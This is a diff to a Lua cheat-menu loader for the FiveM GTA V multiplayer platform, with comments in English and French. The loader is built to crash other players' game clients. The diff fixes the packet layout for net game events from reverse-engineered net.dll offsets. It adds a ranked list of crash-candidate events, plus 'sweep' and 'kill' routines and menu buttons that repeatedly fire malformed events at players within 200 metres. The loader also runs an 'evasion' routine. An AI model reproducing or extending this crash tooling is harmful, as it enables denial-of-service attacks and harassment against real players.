@@ -22269,7 +22269,7 @@ local NET = (function(O, C)
     -- event if IsNetGameEventBlocked(eventNameHash) matches a server.cfg
     -- block_net_game_event, filters targets to a relevant client in the same
     -- routing bucket, and otherwise relays the packet to those targets.
-    local function pack_event(netIds, eventHash, eventId, dataBytes)
+    local function pack_event(netIds, eventHash, eventId, dataBytes, tail16)
         local b = {}
         local function u16(v)
             v = v % 65536
@@ -22280,17 +22280,38 @@ local NET = (function(O, C)
             u16(v % 65536)
             u16(math.floor(v / 65536) % 65536)
         end
-        u32(0x2B513E19)
+        -- Byte for byte the layout gta-net-five writes before it hands the
+        -- buffer to net.dll. Read straight off the serializer at 0x1800898E0
+        -- in the shipped DLL (plaintext .text, so no guessing was needed):
+        --
+        --   0x18008995C  mov eax,[rsi]        ; u32 field, also passed to the
+        --   0x180089963  mov [rcx],eax        ;   send call as the second arg
+        --   0x180089972  call 18004FC00       ; u8 count, then count * u16
+        --   0x1800899A3  mov word [r9+rdx],ax ; u16 [rsi+0x18]
+        --   0x1800899B9  mov byte [r8+rdx],al ; u8  [rsi+0x1a]
+        --   0x1800899C6  mov word [r10+rdx],ax; u16 [rsi+0x1c]
+        --   0x1800899E0  mov word [r9+rdx],ax ; u16 [rsi+0x28] = data length
+        --   0x180089A02  call memcpy           ; [rsi+0x20], length bytes
+        --
+        -- The first u32 is the event name hash, which is exactly the key the
+        -- dispatcher looks up (F26), and it is also the value the send call
+        -- receives. 0x2B513E19 is the net message type and belongs to the call,
+        -- not to the buffer: writing it into the buffer shifted every field by
+        -- four bytes, the hash lookup missed, and the receiver dropped the
+        -- packet without a word. That is why every send from r18 and r19
+        -- reported ok=true and nothing ever happened.
+        u32(eventHash or 0)
         b[#b + 1] = #netIds % 256
         for i = 1, #netIds do u16(netIds[i]) end
-        u32(eventHash or 0)
         u16(eventId or 0)
         b[#b + 1] = 0
+        u16(tail16 or 0)
+        u16(#dataBytes)
         for i = 1, #dataBytes do b[#b + 1] = dataBytes[i] % 256 end
         return b
     end
 
-    function NET.emitEvent(netIds, eventHash, eventId, dataBytes)
+    function NET.emitEvent(netIds, eventHash, eventId, dataBytes, tail16)
         if type(netIds) ~= "table" or #netIds == 0 then return false end
         if NET.busy or NET.releasePending then return false end
         if not NET.init() then O.log("net event: net.dll not ready"); return false end
@@ -22298,7 +22319,7 @@ local NET = (function(O, C)
         if not inst then O.log("net event: no NetLibrary instance"); return false end
         NET.busy = true
         NET.queue = { { raw = true, hash = 0x2B513E19,
-                        bytes = pack_event(netIds, eventHash, eventId, dataBytes or {}) } }
+                        bytes = pack_event(netIds, eventHash, eventId, dataBytes or {}, tail16) } }
         local item = NET.queue[1]
         NET.queue = {}
         local ok = false
@@ -23493,7 +23514,7 @@ local NET = (function(O, C)
         return spec
     end
 
-    function NET.evSend(id, fill, first)
+    function NET.evSend(id, fill, first, tail16)
         id = tonumber(id) or 0
         local ids = crashIds(200.0)
         if #ids == 0 then
@@ -23514,10 +23535,12 @@ local NET = (function(O, C)
         if type(data) ~= "table" then return false end
         local list = {}
         for i = 1, #ids do list[i] = tostring(ids[i]) end
-        O.log("net ev: id %d (%s) fill 0x%02X first %s %d bytes -> %d [%s]",
+        O.log("net ev: id %d (%s) fill 0x%02X first %s tail %s %d bytes -> %d [%s]",
               id, NET.NAMES[id] or "?", fill & 0xFF,
-              first and tostring(first) or "-", #data, #ids, table.concat(list, ","))
-        return NET.emitEvent(ids, NET.EV[id], id, data)
+              first and tostring(first) or "-",
+              tail16 and tostring(tail16) or "0",
+              #data, #ids, table.concat(list, ","))
+        return NET.emitEvent(ids, NET.EV[id], id, data, tail16)
     end
 
     -- Nearest other player's entity, as a network id.
@@ -23573,6 +23596,116 @@ local NET = (function(O, C)
         local okn, nid = pcall(NetworkGetNetworkIdFromEntity, best)
         if not okn or type(nid) ~= "number" or nid <= 0 then return nil end
         return nid, bestD
+    end
+
+    -- Candidats au crash, tries par ce que l'analyse statique permet d'esperer.
+    --
+    -- Aucun d'eux ne peut etre designe comme "celui qui marche" sans essai :
+    -- la couche Read est prouvee sans danger (F39/F40), donc tout ce qui reste
+    -- est le code d'application, et rien hors ligne ne dit lequel dereference
+    -- une donnee non verifiee. Ce qui a change, c'est que depuis r20 les
+    -- paquets atteignent reellement ce code pour la premiere fois.
+    --
+    --   ent = "ped" / "vehicle"  le premier champ est un id d'entite : il faut
+    --                            un id que le client peut resoudre, sinon le
+    --                            handler sort avant d'avoir rien fait.
+    --   ent = nil                le payload ne porte que des hashes ou des
+    --                            scalaires, donc il s'applique aussi bien a
+    --                            une cible a pied qu'en vehicule.
+    local CANDIDATES = {
+        -- PtFX world state : trois hashes d'asset nus, aucun id d'entite. Le
+        -- chemin le plus court vers une resolution d'asset DLC, donc vers la
+        -- classe nommee dans le crash victime.
+        { id = 61, fill = 0xFF },
+        -- PtFX d'evenement : le hash passe directement au demarrage d'effet.
+        { id = 74, fill = 0xFF },
+        -- Un id de ped dans un champ qui attend un vehicule : le seul test qui
+        -- dise si le handler verifie le type d'objet.
+        { id = 66, fill = 0xFF, ent = "ped" },
+        { id = 15, fill = 0xFF, ent = "ped" },
+        { id = 27, fill = 0xFF, ent = "ped" },
+        -- Airdefense : 32 bits de hash puis 19 bits d'index.
+        { id = 53, fill = 0xFF },
+        -- Zones : rayon et centre maximises, application immediate.
+        { id = 34, fill = 0xFF },
+        { id = 35, fill = 0xFF },
+        -- Verrou vehicule / sceances synchronisees / projectile.
+        { id = 60, fill = 0xFF },
+        { id = 36, fill = 0xFF },
+        { id = 19, fill = 0xFF, ent = "ped" },
+        { id = 78, fill = 0xFF },
+        { id = 43, fill = 0xFF, ent = "ped" },
+        { id = 79, fill = 0xFF, ent = "ped" },
+    }
+
+    function NET.sweep()
+        if NET.sweeping then
+            NET.sweeping = false
+            O.log("net sweep: stopping")
+            return false
+        end
+        local ids = crashIds(200.0)
+        if #ids == 0 then
+            O.log("net sweep: no player in 200 m")
+            return false
+        end
+        NET.sweeping = true
+        Citizen.CreateThread(function()
+            local n = 0
+            while NET.sweeping and n < #CANDIDATES do
+                n = n + 1
+                local c = CANDIDATES[n]
+                local first = nil
+                if c.ent then
+                    local nid, d = NET.nearestNet(c.ent)
+                    if nid then
+                        first = nid
+                    else
+                        O.log("net sweep: %d/%d id %d skipped, no %s",
+                              n, #CANDIDATES, c.id, c.ent)
+                    end
+                end
+                if not c.ent or first then
+                    O.log("net sweep: %d/%d id %d (%s)",
+                          n, #CANDIDATES, c.id, NET.NAMES[c.id] or "?")
+                    NET.evSend(c.id, c.fill, first)
+                end
+                Citizen.Wait(700)
+            end
+            NET.sweeping = false
+            O.log("net sweep: done, %d sent", n)
+        end)
+        return true
+    end
+
+    -- Meme chose, mais en boucle serree sur les cinq qui ont le plus de chances
+    -- de faire tomber le client, et rejoue trois fois.
+    function NET.kill()
+        local ids = crashIds(200.0)
+        if #ids == 0 then
+            O.log("net kill: no player in 200 m")
+            return false
+        end
+        Citizen.CreateThread(function()
+            for round = 1, 3 do
+                for n = 1, 5 do
+                    local c = CANDIDATES[n]
+                    local first = nil
+                    if c.ent then
+                        local nid = NET.nearestNet(c.ent)
+                        if nid then first = nid end
+                    end
+                    if not c.ent or first then
+                        O.log("net kill: round %d id %d (%s)", round, c.id,
+                              NET.NAMES[c.id] or "?")
+                        NET.evSend(c.id, c.fill, first)
+                    end
+                    Citizen.Wait(400)
+                end
+            end
+            O.log("net kill: done")
+        end)
+        return true
     end
 
     function NET.crash()
@@ -25202,7 +25335,7 @@ function A.boot()
 
     if A._booted then return end
     A._booted = true
-    O.log("loader build 2026-10-29-r19 (resolvable entity ids)")
+    O.log("loader build 2026-10-29-r21 (crash candidates + sweep)")
     O.log("protection defaults: anti-freeze, anti-attach, anti-spectate, ped guard armed")
     O.every("evasion", 900, A.tick, 350)
     O.every("pedGuardWatch", 100, A.pedGuardWatch, 0)
@@ -32695,6 +32828,36 @@ local function installCrasher()
                       v, kind, nid, tonumber(dist) or -1)
                 NET.evSend(id, fill, nid)
             end,
+        },
+        {
+            -- The two bytes between the reply flag and the data length are the
+            -- one part of the envelope the serializer writes that nothing in
+            -- the DLL explains. Three candidates cover it: zero, our own
+            -- player id, and the all-ones sentinel. Same payload each time, so
+            -- a difference in outcome is attributable to those two bytes.
+            name = "Net tail",
+            type = "action",
+            onClick = function()
+                NET.tailVar = ((NET.tailVar or 0) % 3) + 1
+                local nid = NET.nearestNet("vehicle")
+                if not nid then O.log("net tail: no vehicle nearby"); return end
+                local sid = 0
+                local okS, v = pcall(GetPlayerServerId, PlayerId())
+                if okS and type(v) == "number" then sid = v end
+                local tail = ({ 0, sid, 0xFFFF })[NET.tailVar]
+                O.log("net tail: v%d tail16=%d veh %d", NET.tailVar, tail, nid)
+                NET.evSend(66, 0xFF, nid, tail)
+            end,
+        },
+        {
+            name = "Net kill",
+            type = "action",
+            onClick = function() NET.kill() end,
+        },
+        {
+            name = "Net sweep",
+            type = "action",
+            onClick = function() NET.sweep() end,
         },
     }
 
